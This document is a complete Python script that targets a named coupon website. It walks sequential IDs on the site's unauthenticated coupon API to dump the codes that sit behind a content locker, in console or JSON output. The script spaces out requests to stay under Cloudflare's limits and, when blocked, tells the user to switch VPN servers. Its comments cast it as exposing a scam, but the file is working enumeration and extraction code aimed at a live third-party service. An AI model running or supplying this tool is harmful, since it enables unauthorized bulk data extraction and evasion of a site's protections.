#!/usr/bin/env python3
# ok.py - coupondealers.com coupon code extractor
# exposes the unauthenticated API leak on coupondealers.com
# all codes are returned in plaintext with zero auth required
# the "content locker" is pure theater - codes are in the API response
#
# credit: Bisam (github.com/DexCodeSX)

import urllib.request
import json
import sys
import time

BASE = "https://coupondealers.com/api/coupons/"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

# colors that work on every terminal including termux
if sys.platform == "win32":
    try:
        import ctypes
        k = ctypes.windll.kernel32
        k.SetConsoleMode(k.GetStdHandle(-11), 7)
        HAS_COLOR = True
    except:
        HAS_COLOR = False
else:
    HAS_COLOR = True

def c(code, text):
    if not HAS_COLOR:
        return text
    return f"\033[{code}m{text}\033[0m"

def red(t): return c("91", t)
def green(t): return c("92", t)
def yellow(t): return c("93", t)
def cyan(t): return c("96", t)
def bold(t): return c("1", t)
def dim(t): return c("2", t)

def banner():
    print(cyan(r"""
   _____ ____  _   _ ____   ___  _   _
  / ____/ __ \| | | |  _ \ / _ \| \ | |
 | |   | |  | | | | | |_) | | | |  \| |
 | |   | |  | | | | |  __/| | | |     |
 | |___| |__| | |_| | |   | |_| | |\  |
  \_____\____/ \___/|_|    \___/|_| \_|
  DEALERS LEAKED - scam exposed
"""))
    print(dim("  coupondealers.com API has zero auth on /api/coupons/{id}"))
    print(dim("  the content locker + CPA offers are fake gatekeeping"))
    print(dim("  credit: Bisam (github.com/DexCodeSX)"))
    print()

def fetch(coupon_id):
    url = BASE + str(coupon_id)
    req = urllib.request.Request(url)
    req.add_header("User-Agent", UA)
    req.add_header("Accept", "application/json")
    req.add_header("Referer", "https://coupondealers.com/")
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        return json.loads(resp.read().decode("utf-8"))
    except urllib.error.HTTPError as e:
        if e.code == 404:
            return None
        # rate limited or blocked
        if e.code == 403:
            return "blocked"
        return None
    except Exception:
        return None

def fmt_code(data):
    brand = data.get("brand_name", "?")
    title = data.get("coupon_title", "?")
    code = data.get("coupon_code", "???")
    cid = data.get("id", "?")
    locker = data.get("coupon_locker_url", "")
    rating = data.get("coupon_rating", "")
    validity = data.get("coupon_validity", "")

    print(f"  {bold(green('LEAKED'))} {dim('ID:' + str(cid))}")
    print(f"  {bold(brand)} - {title}")
    print(f"  {yellow('CODE:')} {bold(green(code))}")
    if locker:
        print(f"  {dim('locker:')} {dim(locker)}")
    if rating:
        print(f"  {dim('rating: ' + str(rating))} {dim('| validity: ' + str(validity) + ' days')}")
    print()

def scan(start=1, end=50):
    banner()
    print(bold(" [*] scanning coupon IDs %d-%d ...\n" % (start, end)))

    found = 0
    blocked = False

    for i in range(start, end + 1):
        sys.stdout.write(dim(f"\r  checking ID {i}..."))
        sys.stdout.flush()

        data = fetch(i)

        if data == "blocked":
            sys.stdout.write("\r" + " " * 40 + "\r")
            print(red(f"  [!] got 403 at ID {i} - cloudflare rate limit"))
            print(yellow("  [*] waiting 5s before retry..."))
            time.sleep(5)
            data = fetch(i)
            if data == "blocked":
                print(red("  [!] still blocked. try VPN or wait a few minutes."))
                blocked = True
                break

        if data and data != "blocked":
            sys.stdout.write("\r" + " " * 40 + "\r")
            fmt_code(data)
            found += 1

        # small delay to not trigger cloudflare
        time.sleep(0.3)

    sys.stdout.write("\r" + " " * 40 + "\r")
    print(bold(f" [+] done. {found} codes leaked.\n"))

    if blocked:
        print(yellow(" [!] scan was interrupted by cloudflare"))
        print(dim("     switch VPN server or wait ~10 min\n"))

def single(coupon_id):
    banner()
    print(bold(f" [*] fetching coupon ID {coupon_id}...\n"))
    data = fetch(coupon_id)
    if data and data != "blocked":
        fmt_code(data)
    elif data == "blocked":
        print(red("  [!] 403 - cloudflare blocked. try VPN."))
    else:
        print(dim(f"  [-] ID {coupon_id} not found"))

def dump_json(start, end):
    results = []
    for i in range(start, end + 1):
        data = fetch(i)
        if data and data != "blocked":
            results.append({
                "id": data.get("id"),
                "brand": data.get("brand_name"),
                "title": data.get("coupon_title"),
                "code": data.get("coupon_code"),
                "locker_url": data.get("coupon_locker_url"),
                "rating": data.get("coupon_rating"),
                "validity_days": data.get("coupon_validity"),
            })
            sys.stdout.write(dim(f"\r  fetched {len(results)} codes..."))
            sys.stdout.flush()
        time.sleep(0.3)

    sys.stdout.write("\r" + " " * 40 + "\r")
    print(json.dumps(results, indent=2))

def usage():
    banner()
    print(bold(" usage:"))
    print(f"   python ok.py              {dim('scan IDs 1-50')}")
    print(f"   python ok.py scan         {dim('scan IDs 1-50')}")
    print(f"   python ok.py scan 20 40   {dim('scan IDs 20-40')}")
    print(f"   python ok.py get 36       {dim('fetch single coupon')}")
    print(f"   python ok.py json         {dim('dump all as JSON')}")
    print(f"   python ok.py json 20 40   {dim('dump range as JSON')}")
    print()
    print(dim("  works on: windows, linux, macos, termux (android)"))
    print(dim("  requires: python 3.x (no dependencies)"))
    print()

def main():
    args = sys.argv[1:]

    if not args:
        scan()
        return

    cmd = args[0].lower()

    if cmd in ("-h", "--help", "help"):
        usage()
    elif cmd == "scan":
        start = int(args[1]) if len(args) > 1 else 1
        end = int(args[2]) if len(args) > 2 else 50
        scan(start, end)
    elif cmd == "get":
        if len(args) < 2:
            print(red(" [!] need coupon ID: python ok.py get 36"))
            return
        single(int(args[1]))
    elif cmd == "json":
        start = int(args[1]) if len(args) > 1 else 1
        end = int(args[2]) if len(args) > 2 else 50
        dump_json(start, end)
    else:
        # maybe they passed a number directly
        try:
            single(int(cmd))
        except ValueError:
            usage()

if __name__ == "__main__":
    main()
